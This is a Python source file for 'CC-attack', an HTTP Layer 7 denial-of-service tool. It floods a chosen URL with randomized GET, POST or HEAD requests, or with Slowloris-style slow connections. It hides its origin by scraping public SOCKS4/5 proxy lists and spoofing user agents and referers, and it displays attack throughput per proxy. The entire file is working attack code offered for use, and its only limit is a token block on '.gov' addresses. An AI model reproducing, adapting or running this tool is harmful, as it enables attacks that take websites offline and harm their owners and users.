#!/usr/bin/python3
#Coded by L330n123
#########################################
#         Just a little change          #
#                           -- L330n123 #
#########################################
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime



print ('''
	   /////    /////    /////////////
	  CCCCC/   CCCCC/   | CC-attack |/
	 CC/      CC/       |-----------|/ 
	 CC/      CC/       |  Layer 7  |/ 
	 CC/////  CC/////   | ddos tool |/ 
	  CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Version 3.6 (2020/12/19)
							C0d3d by L330n123
┌─────────────────────────────────────────────┐
│        Tos: Don't attack .gov website       │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│          [+] Optimization                   │
│          [+] Changed Output                 │
│          [+] Added Url Parser               │
├─────────────────────────────────────────────┤
│ Link: https://github.com/Leeon123/CC-attack │
└─────────────────────────────────────────────┘''')

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
]
ind_dict = {}
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
###################################################
Intn = random.randint
Choice = random.choice
###################################################
def build_threads(mode,thread_num,event,socks_type,ind_rlock):
	if mode == "post":
		for _ in range(thread_num):
			th = threading.Thread(target = post,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "cc":
		for _ in range(thread_num):
			th = threading.Thread(target = cc,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "head":
		for _ in range(thread_num):
			th = threading.Thread(target = head,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()

def getuseragent():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomurl():
	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))

def GenReqHeader(method):
	global data
	header = ""
	if method == "get" or method == "head":
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		accept = Choice(acceptall)
		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
		useragent = "User-Agent: " + getuseragent() + "\r\n"
		header =  referer + useragent + accept + connection + "\r\n"
	elif method == "post":
		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer = "Referer: http://"+ target + path + "\r\n"
		user_agent = "User-Agent: " + getuseragent() + "\r\n"
		accept = Choice(acceptall)
		if mode2 != "y":# You can enable customize data
			data = str(random._urandom(16))
		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
		if cookies != "":
			length += "Cookies: "+str(cookies)+"\r\n"
		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	return header

def ParseUrl(original_url):
	global target
	global path
	global port
	global protocol
	original_url = original_url.strip()
	url = ""
	path = "/"#default value
	port = 80 #default value
	protocol = "http"
	#http(s)://www.example.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #for debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#detect the port
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx

def InputOption(question,options,default):
	ans = ""
	while ans == "":
		ans = str(input(question)).strip().lower()
		if ans == "":
			ans = default
		elif ans not in options:
			print("> Please enter the correct option")
			ans = ""
			continue
	return ans

def CheckerOption():
	global proxies
	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
	if N == 'y' or N == "" :
		downloadsocks(choice)
	else:
		pass
	if choice == "4":
		out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
		if out_file == '':
			out_file = str("socks4.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	elif choice == "5":
		out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
		if out_file == '':
			out_file = str("socks5.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	if len(proxies) == 0:
		print("> There are no more proxies. Please download a new one.")
		sys.exit(1)
	print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
	time.sleep(0.03)
	ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
	if ans == "":
		ans = "y"
	if ans == "y":
		ms = str(input("> Delay of socks(seconds, default=5):"))
		if ms == "":
			ms = int(5)
		else :
			try:
				ms = int(ms)
			except :
				ms = float(ms)
		check_socks(ms)

def SetupIndDict():
	global ind_dict
	for proxy in proxies:
		ind_dict[proxy.strip()] = 0

def OutputToScreen(ind_rlock):
	global ind_dict
	i = 0
	sp_char = ["|","/","-","\\"]
	while 1:
		if i > 3:
			i = 0
		print("{:^70}".format("Proxies attacking status"))
		print("{:^70}".format("IP:PORT   <->   RPS    "))
		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
		ind_rlock.acquire()
		top_num = 0
		top10= sorted(ind_dict, key=ind_dict.get, reverse=True)
		if len(top10) > 10:
			top_num = 10
		else:
			top_num = len(top10)
		for num in range(top_num):
			top = "none"
			rps = 0
			if len(ind_dict) != 0:
				top = top10[num]
				rps = ind_dict[top]
				ind_dict[top] = 0
			print("{:^70}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
		total = 0
		for k,v in ind_dict.items():
			total = total + v
			ind_dict[k] = 0
		ind_rlock.release()
		print("{:^70}".format(" ["+sp_char[i]+"] CC attack | Total Rps:"+str(total)))
		i+=1
		time.sleep(1)
		print("\n"*100)

def cc(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = get_host + header
					sent = s.send(str.encode(request))
					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:
			s.close()

def head(event,socks_type,ind_rlock):#HEAD MODE
	global ind_dict
	header = GenReqHeader("head")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = head_host + header
					sent = s.send(str.encode(request))
					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break#   This part will jump to dirty fix
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:#dirty fix
			s.close()

def post(event,socks_type,ind_rlock):
	global ind_dict
	request = GenReqHeader("post")
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					sent = s.send(str.encode(request))
					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:
			s.close()

socket_list=[]
def slow(conn,socks_type):
	proxy = Choice(proxies).strip().split(":")
	for _ in range(conn):
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.settimeout(1)
			s.connect((str(target), int(port)))
			if str(port) == '443':
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
			if cookies != "":
				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
			s.send(("Connection:keep-alive").encode("utf-8"))
			
			socket_list.append(s)
			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
			sys.stdout.flush()
		except:
			s.close()
			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
			sys.stdout.flush()
	while True:
		for s in list(socket_list):
			try:
				s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				s.close()
				socket_list.remove(s)
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
		proxy = Choice(proxies).strip().split(":")
		for _ in range(conn - len(socket_list)):
			try:
				if socks_type == 4:
					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
				if socks_type == 5:
					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
				s.settimeout(1)
				s.connect((str(target), int(port)))
				if int(port) == 443:
					ctx = ssl.SSLContext()
					s = ctx.wrap_socket(s,server_hostname=target)
				s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
				s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
				if cookies != "":
					s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
				s.send(("Connection:keep-alive").encode("utf-8"))
				socket_list.append(s)
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				proxy = Choice(proxies).strip().split(":")
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
				pass
nums = 0
def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
	global nums
	global proxies
	proxy = lines.strip().split(":")
	if len(proxy) != 2:
		rlock.acquire()
		proxies.remove(lines)
		rlock.release()
		return
	err = 0
	while True:
		if err >= 3:
			rlock.acquire()
			proxies.remove(lines)
			rlock.release()
			break
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.settimeout(ms)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms):#Coded by Leeon123
	global nums
	thread_list=[]
	rlock = threading.RLock()
	for lines in list(proxies):
		if choice == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
			th.start()
		if choice == "4":
			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
	ans = input("> Do u want to save them in a file? (y/n, default=y)")
	if ans == "y" or ans == "":
		if choice == "4":
			with open("socks4.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("> They are saved in socks4.txt.")
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("> They are saved in socks5.txt.")
			
def check_list(socks_file):
	print("> Checking list")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i:
				temp_list.append(i)
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def downloadsocks(choice):
	if choice == "4":
		f = open("socks4.txt",'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxyscan.io/download?type=socks4",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",timeout=5)
			f.write(r.content)
			f.close()
		except:
			f.close()
		try:#credit to All3xJ
			r = requests.get("https://www.socks-proxy.net/",timeout=5)
			part = str(r.content)
			part = part.split("<tbody>")
			part = part[1].split("</tbody>")
			part = part[0].split("<tr><td>")
			proxies = ""
			for proxy in part:
				proxy = proxy.split("</td><td>")
				try:
					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
				except:
					pass
				out_file = open("socks4.txt","a")
				out_file.write(proxies)
				out_file.close()
		except:
			pass
		print("> Have already downloaded socks4 list as socks4.txt")
	if choice == "5":
		f = open("socks5.txt",'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
			f.write(r.content)
			f.close()
		except:
			f.close()
		print("> Have already downloaded socks5 list as socks5.txt")
def prevent():
	if '.gov' in url :
		print("> You can't attack .gov website!")
		exit()
	
def main():
	global multiple
	global choice
	global data
	global mode2
	global cookies
	global brute
	global url
	print("> Mode: [cc/post/head/slow/check]")
	mode = InputOption("> Choose Your Mode (default=cc) :",["cc","post","head","slow","check"],"cc")
	url = str(input("> Input the target url:")).strip()
	prevent()
	ParseUrl(url)
	if mode == "post":
		mode2 = InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
		if mode2 == "y":
			data = open(str(input("> Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
	choice2 = InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
	if choice2 == "y":
		cookies = str(input("Plese input the cookies:")).strip()
	choice = InputOption("> Choose your socks mode(4/5, default=5):",["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	if mode == "check":
		CheckerOption()
		print("> End of process")
		return
	if mode == "slow":	
		thread_num = str(input("> Connections(default=400):"))
	else:
		thread_num = str(input("> Threads(default=400):"))
	if thread_num == "":
		thread_num = int(400)
	else:
		try:
			thread_num = int(thread_num)
		except:
			sys.exit("Error thread number")
	CheckerOption()
	if len(proxies) == 0:
		print("> There are no more proxies. Please download a new one.")
		return
	ind_rlock = threading.RLock()
	if mode == "slow":
		input("Press Enter to continue.")
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		multiple = str(input("> Input the Magnification(default=100):"))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		brute = str(input("> Enable boost mode[beta](y/n, default=n):"))
		if brute == "":
			brute = False
		elif brute == "y":
			brute = True
		elif brute == "n":
			brute = False
		event = threading.Event()
		print("> Building threads...")
		SetupIndDict()
		build_threads(mode,thread_num,event,socks_type,ind_rlock)
		event.clear()
		input("Press Enter to continue.")
		event.set()
		threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
	while True:
		try:
			time.sleep(0.1)
		except KeyboardInterrupt:
			break
	

if __name__ == "__main__":
	main()#Coded by Leeon123
